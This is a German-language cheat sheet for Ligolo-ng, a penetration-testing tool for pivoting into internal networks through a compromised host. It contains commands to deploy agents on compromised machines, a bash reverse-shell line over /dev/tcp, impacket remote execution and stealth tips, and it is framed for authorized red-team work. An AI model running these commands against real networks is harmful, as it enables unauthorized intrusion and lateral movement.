<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔀 Ligolo-ng – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```
<p align="center">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN-Schnittstelle">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Network Pivoting">
</p>

<p align="center">
  <b>🌐 Modernes, einfaches und leistungsstarkes Pivoting-Tool mit TUN-Schnittstellen anstelle von SOCKS-Proxys</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-Einführung)
- [Warum Ligolo-ng? (Ligolo-ng vs. SOCKS/Proxychains)](#-why-ligolo-ng)
- [Architektur und wie sie funktioniert](#-architecture--how-it-works)
- [Installation](#-Installation)
- [Kurzanleitung](#-quick-start-guide)
  - [Schritt 1: TUN-Schnittstelle auf Angreifer einrichten](#step-1-setup-tun-interface-on-attacker)
  - [Schritt 2: Starten Sie den Ligolo-ng-Proxy](#step-2-start-the-ligolo-ng-proxy)
  - [Schritt 3: Stellen Sie den Agenten auf dem Pivot-Ziel bereit](#step-3-deploy-the-agent-on-pivot-target)
  - [Schritt 4: Routing für Angreifer konfigurieren](#step-4-configure-routing-on-attacker)
  - [Schritt 5: Tunnelsitzung starten](#step-5-start-the-tunnel-session)
- [Reverse-Port-Weiterleitung (Listener)](#-reverse-port-forwarding-listeners)
- [Doppeltes Pivotieren (mehrstufiges Pivotieren)](#-double-pivoting-multi-tier-pivoting)
- [Referenz zu interaktiven Proxy-Befehlen](#-proxy-interactive-commands-reference)
- [Agent-Befehlszeilenoptionen](#-agent-command-line-options)
- [Fehlerbehebung und Best Practices](#-troubleshooting--best-practices)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
- [Ressourcen](#-Ressourcen)

---

## 🎯 Einführung

**Ligolo-ng** ist ein fortschrittliches, leichtes und schnelles Tunnel- und Pivot-Tool, das in Go geschrieben wurde. Im Gegensatz zu herkömmlichen SOCKS-Proxys (wie Standard-Chisel oder dynamische SSH-Weiterleitung) richtet Ligolo-ng eine virtuelle **TUN-Schnittstelle** direkt auf dem Computer Ihres Angreifers ein.

Dadurch wird Ihr kompromittierter Pivot-Host zu einem echten VPN-ähnlichen Gateway: Alle Tools auf Ihrem Angreifercomputer (einschließlich `nmap -sS`, `crackmapexec`, `evil-winrm`,

---

## ⚖️ Warum Ligolo-ng?

| Funktion | Ligolo-ng | Proxychains + SOCKEN | SSH-SOCKEN (`-D`) |
|---------|-----------|-------|------------------|
| **Protokollunterstützung** | Vollständiges TCP und UDP | Nur TCP (schlechtes UDP) | Nur TCP |
| **Nmap SYN-Scan (`-sS`)**| ✅ Ja (Muttersprache) | ❌ Nein (erfordert TCP `-sT`) | ❌ Nein |
| **Tool-Kompatibilität** | 100 % (Kernel-IP-Stack) | Inkonsistent (LD_PRELOAD) | Inkonsistent |
| **Geschwindigkeit und Latenz** | ⭐⭐⭐⭐⭐ Sehr schnell | ⭐⭐⭐ Mäßig | ⭐⭐⭐ Mäßig |
| **Keine SOCKEN-Hülle** | ✅ Ja | ❌ Erfordert Wrapper | ❌ Erfordert Wrapper |
| **Umgekehrte Zuhörer** | ✅ Eingebaut | ❌ Erfordert separates Werkzeug | ❌ Begrenzt |

---

## 🏗️ Architektur und wie sie funktioniert
```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```
1. **Proxy:** Läuft auf Ihrem Angreifercomputer, verwaltet Sitzungen und überbrückt Pakete zwischen Ihrer virtuellen TUN-Schnittstelle und verbundenen Agenten.
2. **Agent:** Eine leichte Binärdatei, die auf dem kompromittierten internen Computer (Linux, Windows, macOS oder ARM) ausgeführt wird.
3. **TUN-Schnittstelle:** Eine unter Linux erstellte Software-Loopback-Netzwerkschnittstelle, die den für interne Subnetze bestimmten Datenverkehr direkt in Ligolo weiterleitet.

---

## 📥 Installation

Laden Sie die neuesten Release-Binärdateien für **Proxy** und **Agent** von der offiziellen GitHub-Release-Seite herunter:
```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```
---

## 🚀 Kurzanleitung

### Schritt 1: Richten Sie die TUN-Schnittstelle auf dem Angreifer ein

Erstellen Sie vor dem Ausführen des Proxys ein dauerhaftes TUN-Gerät auf Ihrem Linux-Angreifercomputer:
```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```
### Schritt 2: Starten Sie den Ligolo-ng-Proxy

Führen Sie den Proxy mit selbstsignierten TLS-Zertifikaten aus:
```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```
> **Tipp:** Sie können auch gültige Let's Encrypt-Zertifikate mit `-certfile` und `-keyfile` bereitstellen, um bei Red-Team-Einsätzen heimlich vorzugehen.

### Schritt 3: Stellen Sie den Agenten auf dem Pivot-Ziel bereit

Übertragen Sie den Agenten auf Ihren kompromittierten Host und führen Sie ihn aus:

#### Auf Linux-Ziel:
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```
#### Auf Windows-Ziel:
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```
### Schritt 4: Routing für Angreifer konfigurieren

Sobald der Agent eine Verbindung herstellt, überprüfen Sie seine Netzwerkschnittstellen von der Proxy-Konsole aus, um die internen Subnetze des Ziels zu ermitteln (z. B. `172.16.1.0/24`).

Fügen Sie auf Ihrem **Angreifer-Terminal** (separates Fenster) eine Route hinzu, die auf die TUN-Schnittstelle verweist:
```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```
### Schritt 5: Starten Sie die Tunnelsitzung

In der interaktiven Ligolo-ng-Proxy-Eingabeaufforderung:
```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```
Jetzt haben Sie direkten, nativen IP-Zugriff auf das interne Netzwerk! Testen Sie es:
```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```
---

## 🔄 Reverse Port Forwarding (Listener)

Möchten Sie eine Reverse-Shell erhalten oder ein NTLM-Authentifizierungs-Relay auf Ihrer Angreifer-Box von einem internen Host abfangen, der nicht zu Ihrer Angreifer-IP zurückleiten kann? Verwenden Sie **Zuhörer**!

Wenn Sie einen Listener in Ligolo-ng konfigurieren, öffnet der Agent einen Überwachungsport auf dem **Pivot-Rechner** und leitet eingehenden Datenverkehr zurück an Ihren Angreifer-Rechner.

### Beispiel: Eine Reverse Shell abfangen

Innerhalb der Proxy-Sitzung:
```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```
Auf Ihrem **Angreifer-Rechner**:
```bash
nc -lvnp 4444
```
Auf einem **internen Ziel** (`172.16.1.75`):
```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```
Der Pivot-Host leitet die Verbindung direkt an Ihren Netcat-Listener weiter!

---

## ⛓️ Doppeltes Pivotieren (mehrstufiges Pivotieren)

Beim Zugriff auf tief verschachtelte Netzwerke (Subnetz A -> Subnetz B -> Subnetz C):

1. Richten Sie Ihren ersten Tunnel zu Pivot 1 (`172.16.1.10`) ein.
2. Entdecken Sie Pivot 2 in Subnetz B (`10.0.0.25`).
3. Richten Sie einen Listener auf Pivot 1 ein, um den Datenverkehr von Subnetz B zurück an Ihren Proxy-Port `11601` weiterzuleiten:
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. Stellen Sie den Ligolo-Agenten auf Pivot 2 bereit und stellen Sie eine Verbindung zur IP von Pivot 1 her:
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. Eine zweite Sitzung wird in Ihrem Proxy angezeigt! Fügen Sie eine Route für Subnetz C hinzu:
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. Wechseln Sie zu Sitzung 2 und geben Sie `start` ein.

---

## ⌨️ Referenz zu interaktiven Proxy-Befehlen

| Befehl | Beschreibung | Beispiel |
|---------|-------------|---------|
| `session` | Aktive Sitzungen verbundener Agenten auflisten und auswählen | `session` |
| `start` | Beginnen Sie mit dem Tunneln von Paketen durch den aktiven Agenten | `start` |
| `stop` | Stoppen Sie die aktive Tunnelsitzung | `stop` |
| `ifconfig` | Netzwerkschnittstellen des ausgewählten Agenten anzeigen | `ifconfig` |
| `listener_add` | Erstellen Sie einen Überwachungsport auf dem Pivot-Agenten | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
| `listener_list`| Alle aktiven Listener auf dem aktuellen Agenten auflisten | `listener_list` |
| `listener_close`| Einen bestimmten aktiven Listener schließen | `listener_close --id 0` |
| `help` | Befehlshilfe anzeigen | `help` |
| `exit` | Proxy beenden oder zum Hauptmenü zurückkehren | `exit` |

---

## ⚙️ Agent-Befehlszeilenoptionen

| Flagge | Beschreibung | Beispiel |
|------|-------------|---------|
| `-connect` | Adresse und Port des Ligolo-Proxys | `-connect 192.168.1.100:11601` |
| `-ignore-cert` | Überprüfung des TLS-Zertifikats überspringen | `-ignore-cert` |
| `-retry` | Bei Verbindungstrennung automatisch Verbindungsversuch wiederholen | `-retry` |
| `-auto-clear` | Terminalausgabe bei Ausführung löschen | `-auto-clear` |

---

## 💡 Fehlerbehebung und Best Practices

1. **TUN-Schnittstelle nach Interaktion löschen:**
   Wenn Sie mit Ihrem Test fertig sind, bereinigen Sie Ihre Routing-Tabelle und löschen Sie die virtuelle Schnittstelle:
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **Überprüfen Sie IP-Subnetzüberlappungen noch einmal:**
   Stellen Sie sicher, dass das interne Subnetz, das Sie weiterleiten (z. B. `192.168.1.0/24`), nicht mit Ihrem lokalen Angreifernetzwerk kollidiert. Wenn es sich überschneidet, verwenden Sie eine spezifischere `/32`-Hostroute (z. B. `sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **Überlegungen zur Firewall bei Pivot:**
   Stellen Sie auf Windows-Zielen sicher, dass die Windows Defender-Firewall ausgehende Verbindungen auf Port 11601 oder dem von Ihnen gewählten Listener-Port zulässt.
4. **Verwenden Sie `-retry` in realen Umgebungen:**
   Führen Sie immer Agenten mit `-retry` aus, um Verbindungen nach vorübergehenden Netzwerkausfällen automatisch wiederherzustellen.

---

## ⚠️ Rechtlicher Haftungsausschluss

> **WICHTIG:** Ligolo-ng ist ein leistungsstarkes Netzwerk-Routing-Dienstprogramm. Es darf nur mit ausdrücklicher schriftlicher Zustimmung bei autorisierten Penetrationstests, Red-Team-Einsätzen und ethischen Sicherheitsbewertungen verwendet werden.

---

## 📚 Ressourcen

- [Offizielles Ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
- [Offizielle Ligolo-ng-Dokumentation](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)